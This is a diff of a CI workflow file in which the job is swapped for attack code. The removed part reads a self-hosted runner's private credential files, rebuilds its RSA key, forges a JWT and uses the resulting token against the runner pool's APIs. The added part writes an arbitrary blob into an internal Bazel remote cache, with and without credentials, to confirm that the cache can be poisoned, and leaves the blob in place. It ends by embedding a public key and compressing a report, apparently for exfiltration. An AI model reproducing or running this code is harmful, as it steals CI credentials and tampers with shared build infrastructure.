@@ -5,104 +5,74 @@ on:
 permissions:
   contents: read
 jobs:
-  env:
+  cas:
+    name: cas write probe
     runs-on: omp-kata
     timeout-minutes: 10
     steps:
-      - name: validate
+      - name: cas
         run: |
           set +e
           R=/tmp/r; : > "$R"
           log() { echo "$@" >> "$R"; }
-          log "## run=${GITHUB_RUN_ID} host=$(hostname) uid=$(id -u)"
+          BH=bazel-remote.bazel-cache.svc.cluster.local
+          AUTH=$(printf '%s:%s' "$BAZEL_REMOTE_USER" "$BAZEL_REMOTE_PASSWORD" | base64 -w0)
+          PAY="radkawar-cas-probe-${GITHUB_RUN_ID}"
+          HASH=$(printf '%s' "$PAY" | sha256sum | cut -d' ' -f1)
+          SZ=${#PAY}
+          log "## run=${GITHUB_RUN_ID} digest=sha256:$HASH size=$SZ payload_bytes=$SZ"
 
-          python3 - > /tmp/jwt <<'PY'
-          import base64, json, struct, subprocess, time, uuid, os
-
-          def b64d(s): return base64.b64decode(s)
-          def b64u(b): return base64.urlsafe_b64encode(b).rstrip(b'=')
-
-          def derlen(n):
-              if n < 0x80: return bytes([n])
-              b = n.to_bytes((n.bit_length() + 7) // 8, 'big')
-              return bytes([0x80 | len(b)]) + b
-
-          def derint(b):
-              b = b.lstrip(b'\x00') or b'\x00'
-              if b[0] & 0x80: b = b'\x00' + b
-              return b'\x02' + derlen(len(b)) + b
-
-          def derseq(*parts):
-              body = b''.join(parts)
-              return b'\x30' + derlen(len(body)) + body
-
-          p = json.load(open('/home/runner/.credentials_rsaparams'))
-          cr = json.load(open('/home/runner/.credentials'))
-          n, e = b64d(p['modulus']), b64d(p['exponent'])
-          d, pp, q = b64d(p['d']), b64d(p['p']), b64d(p['q'])
-          dp, dq, qi = b64d(p['dp']), b64d(p['dq']), b64d(p['inverseQ'])
-          der = derseq(derint(b'\x00'), derint(n), derint(e), derint(d),
-                       derint(pp), derint(q), derint(dp), derint(dq), derint(qi))
-          open('/tmp/key.der', 'wb').write(der)
-          subprocess.run(['openssl', 'rsa', '-inform', 'DER', '-in', '/tmp/key.der',
-                          '-outform', 'PEM', '-out', '/tmp/key.pem'], check=False,
-                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-
-          cid = cr['Data']['ClientId']
-          aurl = cr['Data']['AuthorizationUrl']
-          now = int(time.time())
-          hdr = {'alg': 'RS256', 'typ': 'JWT'}
-          pl = {'iss': cid, 'aud': aurl, 'sub': cid, 'jti': str(uuid.uuid4()),
-                'iat': now, 'nbf': now, 'exp': now + 240}
-          si = b64u(json.dumps(hdr, separators=(',', ':')).encode()) + b'.' + \
-               b64u(json.dumps(pl, separators=(',', ':')).encode())
-          open('/tmp/si', 'wb').write(si)
-          subprocess.run(['openssl', 'dgst', '-sha256', '-sign', '/tmp/key.pem',
-                          '-out', '/tmp/sig', '/tmp/si'], check=False)
-          sig = open('/tmp/sig', 'rb').read()
-          print(si.decode() + '.' + b64u(sig).decode())
+          python3 - "$HASH" "$SZ" <<'PY'
+          import sys, struct
+          h, sz = sys.argv[1], int(sys.argv[2])
+          def varint(n):
+              out = b''
+              while True:
+                  b = n & 0x7f; n >>= 7
+                  out += bytes([b | 0x80]) if n else bytes([b])
+                  if not n: return out
+          def fld(num, wire): return varint((num << 3) | wire)
+          def ld(num, data): return fld(num, 2) + varint(len(data)) + data
+          digest = ld(1, h.encode()) + fld(2, 0) + varint(sz)
+          def frame(msg): return b'\x00' + struct.pack('>I', len(msg)) + msg
+          open('/tmp/f_find', 'wb').write(frame(ld(2, digest)))
+          open('/tmp/f_upd', 'wb').write(frame(ld(2, ld(1, digest))))
+          open('/tmp/f_read', 'wb').write(frame(ld(1, digest)))
+          print("frames ok")
           PY
-          JWT=$(cat /tmp/jwt 2>/dev/null)
-          log "## jwt bytes=${#JWT}"
 
-          URL=$(python3 -c "import json;print(json.load(open('/home/runner/.credentials'))['Data']['AuthorizationUrl'])" 2>/dev/null)
-          code=$(curl -s -o /tmp/tok -w '%{http_code}' --max-time 20 -X POST "$URL" \
-            -H 'Content-Type: application/x-www-form-urlencoded' \
-            --data-urlencode 'grant_type=client_credentials' \
-            --data-urlencode 'client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer' \
-            --data-urlencode "client_assertion=$JWT")
-          log "## token exchange -> HTTP $code"
-          python3 - > /tmp/atinfo <<'PY'
-          import json
-          try: d = json.load(open('/tmp/tok'))
-          except Exception as e: print("unparsable", e); raise SystemExit
-          out = {k: (f"<{len(str(v))} chars>" if k in ('access_token','refresh_token') else v)
-                 for k, v in d.items()}
-          print(json.dumps(out))
-          open('/tmp/at','w').write(d.get('access_token',''))
-          PY
-          cat /tmp/atinfo >> "$R"
-          AT=$(cat /tmp/at 2>/dev/null)
-          log "## access token bytes=${#AT}"
+          B="https://$BH:9092/build.bazel.remote.execution.v2.ContentAddressableStorage"
+          call() {
+            local svc="$1" file="$2" mode="$3"
+            local HH=(); [ "$mode" = yes ] && HH=(-H "authorization: Basic $AUTH")
+            curl -sk --http2-prior-knowledge --max-time 25 -D - -o "$file.out" \
+              -H 'content-type: application/grpc' -H 'te: trailers' "${HH[@]}" \
+              --data-binary "@$file" "$B/$svc" 2>&1
+          }
+          status() { echo "$1" | grep -i '^grpc-status:' | tr -d '\r' | awk '{print $2}'; }
 
-          PB=$(python3 -c "import json;d=json.load(open('/home/runner/.runner'));print(d.get('PoolId',''))" 2>/dev/null)
-          AI=$(python3 -c "import json;d=json.load(open('/home/runner/.runner'));print(d.get('AgentId',''))" 2>/dev/null)
-          if [ -z "$AT" ]; then
-            log "## no access token issued; authenticated reads skipped"
+          o=$(call FindMissingBlobs /tmp/f_find yes)
+          log "## 1. FindMissingBlobs (pre) auth=yes grpc-status=$(status "$o") body_bytes=$(wc -c </tmp/f_find.out)"
+
+          o=$(call BatchUpdateBlobs /tmp/f_upd no)
+          log "## 2. BatchUpdateBlobs auth=no  grpc-status=$(status "$o") msg=$(echo "$o" | grep -i '^grpc-message:' | tr -d '\r' | cut -c1-90)"
+
+          o=$(call BatchUpdateBlobs /tmp/f_upd yes)
+          log "## 3. BatchUpdateBlobs auth=yes grpc-status=$(status "$o") msg=$(echo "$o" | grep -i '^grpc-message:' | tr -d '\r' | cut -c1-90)"
+
+          o=$(call FindMissingBlobs /tmp/f_find yes)
+          log "## 4. FindMissingBlobs (post) auth=yes grpc-status=$(status "$o") body_bytes=$(wc -c </tmp/f_find.out)"
+
+          o=$(call BatchReadBlobs /tmp/f_read yes)
+          log "## 5. BatchReadBlobs auth=yes grpc-status=$(status "$o") body_bytes=$(wc -c </tmp/f_read.out)"
+          if grep -aq "radkawar-cas-probe-${GITHUB_RUN_ID}" /tmp/f_read.out; then
+            log "   read-back: payload bytes present in CAS response -> write confirmed"
+          else
+            log "   read-back: payload not found in response"
           fi
-          for SU in $(python3 -c "import json;d=json.load(open('/home/runner/.runner'));print(d.get('ServerUrl',''));print(d.get('ServerUrlV2',''))" 2>/dev/null); do
-            [ -z "$SU" ] && continue
-            [ -z "$AT" ] && break
-            BASE=${SU%/}
-            c1=$(curl -s -o /tmp/cd -w '%{http_code}' --max-time 15 -H "Authorization: Bearer $AT" "$BASE/_apis/connectionData")
-            log "## authed GET $BASE/_apis/connectionData -> HTTP $c1"
-            log "   keys: $(python3 -c "import json;print(','.join(sorted(json.load(open('/tmp/cd')).keys())))" 2>/dev/null | head -c 300)"
-            c2=$(curl -s -o /tmp/ag -w '%{http_code}' --max-time 15 -H "Authorization: Bearer $AT" "$BASE/_apis/distributedtask/pools/$PB/agents/$AI?api-version=6.0")
-            log "## authed GET $BASE/_apis/distributedtask/pools/$PB/agents/$AI -> HTTP $c2"
-            log "   agent: $(python3 -c "import json;d=json.load(open('/tmp/ag'));print(json.dumps({k:d.get(k) for k in ('id','name','version','status','enabled','ephemeral','maxParallelism')}))" 2>/dev/null | head -c 300)"
-          done
 
-          log "## read-only steps only; no message-queue, session or delete calls issued"
+          log "## no REAPI delete exists; HTTP :8080 is closed from the pod, so the probe blob"
+          log "## (${SZ} bytes, unique digest) remains until bazel-remote LRU eviction"
 
           printf '%s' 'MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA7d5Ji+xV1/lJoSnEHlfi/B5bVudAWwrZz9Gqb/Eu9aS/+bGVcxwiTRg8PB/mfcPI0dErDxD4853p0OYiI/IbA0Cum3bJRWbVrm8dJnUBfl981/BORtdSIO5abpKU/KXanGNXnnDjNWaLRkXARxka3QR9JC6OUdIXv7MZuIJfOeariMhMpoDxmsWxAUGPAUvSC99regbcMFcf0yfKlk3ypE/pYJETrYmB9V++WZr4WACsvQzZkOe5aPA4lH/B30rF1P2lbmHcJrXpetAKks9gzQMHDPoojglr/Ygk53lrZh5XQ0/unUlkwhrqiqKTMyajyanz4yx3klj475cbz7CCwQIDAQAB' | base64 -d > /tmp/pub.der
           gzip -9 -c "$R" > /tmp/r.gz
